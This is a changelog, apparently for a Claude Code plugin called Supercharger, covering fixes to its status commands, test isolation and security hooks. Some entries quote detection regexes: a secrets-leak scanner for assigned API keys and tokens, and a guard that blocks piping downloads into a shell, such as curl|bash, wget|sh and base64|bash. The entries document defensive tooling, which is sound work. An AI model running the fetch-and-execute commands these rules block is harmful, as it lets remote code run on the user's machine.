- [2.7.75] - 2026-07-06 — fix(command): /sc-status "Memory" now reports Claude's curated file-memory, not the git-gated session file. The field read `.claude/supercharger-memory.md` (written by session-memory-write under a differential gate that only rewrites when tracked git signals change) — so on an actively-developed project it showed things like "945 bytes, 69 days ago", which reads as broken when it isn't. That file is stale BY DESIGN and isn't the memory the user actually curates. Switched the field to the file-memory dir `~/.claude/projects/$ENC/memory/` (reusing $ENC from STEP 0): counts entry files (`*.md` excluding the MEMORY.md index) and shows the newest mtime as "updated" — i.e. `Memory: 8 entries, updated 1d ago`. That's the memory the user maintains and that gets recalled. The session-memory file still functions (SessionStart injection); it's just no longer surfaced as a status row. The session-memory-write hook is untouched (4 tests still cover it).

- [2.7.74] - 2026-07-06 — fix(security): output-secrets-scanner cried wolf on the bare words "API key" / "access token", and /trust-mcp's reader normalized looser than its writer. Surfaced mid-audit of /trust-mcp: the scanner fired 4× on benign output (trust-mcp.sh help text, elicitation-guard comments, this audit's own discussion) because pattern #7 was keyword-ONLY — `[Aa][Pp][Ii]…[Kk][Ee][Yy]|…secret|…access[_-]token` with no value requirement, unlike every other pattern in the array (which anchor on a value/high-entropy token). A scanner that flags the English phrase "API key" in any comment/doc trains the user to ignore it — undermining the security layer's whole credibility. Fixed to require an ASSIGNED value: `(<keyword>)["[:space:]]{0,3}[:=][^A-Za-z0-9]{0,3}[A-Za-z0-9_/+.-]{16,}` — same label+value approach as the AWS_SECRET_ACCESS_KEY pattern. Verified: 0 match on 6 benign prose phrases (2 previously false-positived), still HITs all 5 real leak formats (`k=v`, `k: "v"`, `k='v'`, `k = v`, `"k":"v"`). 2 regression tests (bare prose must NOT fire; assigned value MUST fire). Second finding, folded in: elicitation-guard's trust reader did only `.strip().lower()` while tools/trust-mcp.sh writes `tr -cd 'a-z0-9_.-'` — so a server name with a stripped char (space/`:`/`@`) was stored reduced but compared un-reduced → trust silently never matched (fail-safe: over-blocks, never over-trusts). Reader now mirrors the writer's normalization exactly (`_normkey`). Same writer/reader-mismatch class as the session's scope-path sweep, applied to a security allowlist.

- [2.7.73] - 2026-07-05 — feat(test): consolidated stale-scope-path sweep + a permanent class guard. Retires the bug family that silently broke /sc-status, /why, /perf, /cache-stats — slash commands referencing scope-file names/suffixes that drifted as hooks added -<session>/-<project-hash> suffixes over dozens of versions. Swept every command + tool: derived ground truth from the writers and cross-checked every reference — result: 0 remaining stale paths (all 4 offenders already fixed v2.7.64–.71; tools clean; .active-profile absence handled everywhere; bare .memory-restored is cleanup-only). NEW meta-test test-command-scope-refs.sh derives, per scope-file base, whether writers use it BARE or SUFFIXED, then fails if any command reads a bare file with a glob/suffix (the /why .blocked-commands-* bug) or a suffixed file bare (the /sc-status .tool-history bug). Proven non-vacuous end-to-end (injected bad ref → FAIL with exact message; restored → PASS). Now a future command that references a drifted path fails at CI instead of silently reporting wrong data. Command-audit tally for the session: 4/4 audited commands had real defects, none caught by the prior 1246 tests — this test closes that gap.

- [2.7.72] - 2026-07-05 — fix(test): quality-gate/typecheck tests leaked cache files into the REAL scope dir. Surfaced by /cache-stats (which — notably — was itself CORRECT, the first of the 4 audited commands with no path/format bug): it honestly reported ~135 quality-gate/typecheck cache files, 133 of them orphaned test artifacts keyed by deleted temp dirs (/var/folders/.../tmp.XXXX/test.py). Root cause: three tests (typecheck cache-hit, quality-gate cache-hit, quality-gate fast-profile) set the PROJECT to a mktemp dir but ran with the real \$HOME, and the hook's project-hash write missed the test's rm (macOS /var vs /private/var symlink → different md5), so a cache file leaked per run (scope-cleanup prunes them weekly, so bounded, but noisy). Now those tests setup_test_home/teardown_test_home (verified: real scope cache count unchanged before/after a full run). Cleaned the 133 existing orphans. Same isolation-leak class as /perf (v2.7.70).

- [2.7.71] - 2026-07-05 — fix(command): /why read the wrong path for 5 of its 6 sources. The scope-file names gained -<session>/-<project-hash> suffixes over many versions but /why was never updated, so it silently found nothing and fell through to the audit log (timing rows, not actions). Corrected: source 2 globbed `.blocked-commands-*` (a suffix that never existed) → the real file is `.blocked-commands` (single global, 538 lines) so block reasons were NEVER surfaced; `.scan-alert` → `.scan-alert-*`; `.failed-commands` → `.failed-commands-*` (per-project hash); `.tool-history` → `.tool-history-*` (per-session); `.user-corrections-*` → `.user-corrections*` (match plain + hashed). Also: the audit-log source now skips rows without a `hook` field (timing/field-less noise). Verified with live data — all six sources now resolve. Same class as the /sc-status and /perf bugs (commands referencing stale scope-file names).

- [2.7.70] - 2026-07-05 — fix(perf): /perf reported a TEST FILE as a hook. Manual-checking /perf (per the "which commands need checking" audit) showed "test-lib-suppress-timing" in the report with real timing. Two bugs: (1) test-isolation leak — test-lib-suppress-timing.sh's HOOK_START_MS tests sourced lib-suppress WITHOUT isolating $HOME, so when .profiling is on (or on bash 5) their EXIT-trap timing write landed in the REAL audit dir under the test file's name (14 records found in today's live audit; 136 field-less "?" records too). Now the test isolates HOME (verified: audit line count unchanged before/after with .profiling on). (2) hook-perf.sh showed any name — now filters to REAL deployed hooks only (hooks/<name>.sh exists, .sh-suffix tolerant), so a test artifact / "unknown" / field-less record can never appear as a hook. Cleaned existing pollution from the live audit. 1 regression test (real hooks shown, test/unknown/missing filtered). Same class as the /sc-status bugs — aggregation over live files, invisible to unit tests.

- [2.7.69] - 2026-07-05 — fix(security): safety.sh pipe-to-shell false-positives — surfaced by cross-checking two /sc-status block logs. (1) The `\\|[[:space:]]*(bash|sh|zsh|dash)` pattern matched the `|` inside `||`, so `X || bash Y` (a logical-OR FALLBACK) was blocked — including Supercharger's OWN subagent-report.sh recovery command (`bash report.sh --latest || bash report.sh --fallback`), i.e. the guard broke the recovery tool. Now anchored with `[^|]` so only a single pipe matches. (2) `<<<.*\\|.*(bash|sh|zsh)` and `base64.*\\|.*(bash|sh|zsh)` lacked a trailing word boundary, so the bare `sh` matched inside a path — `grep -rn "^<<<<<" .` run from a "shopify/..." dir was blocked. Added `([[:space:]]|$)`. Verified both directions: `|| bash`, `|| make`, `&&…|| bash`, and grep-in-shopify now pass; curl|bash, echo|bash, wget|sh, base64|bash, herestring|sh, pipe-bash-c all still block. 3 regression tests. Cross-session /sc-status validation also confirmed clean: global fields (tier/MCP/hook/subagents) match across both sessions, per-session fields (cost/memory/lessons/compact) differ correctly, v2.7.68 profile fix holds.
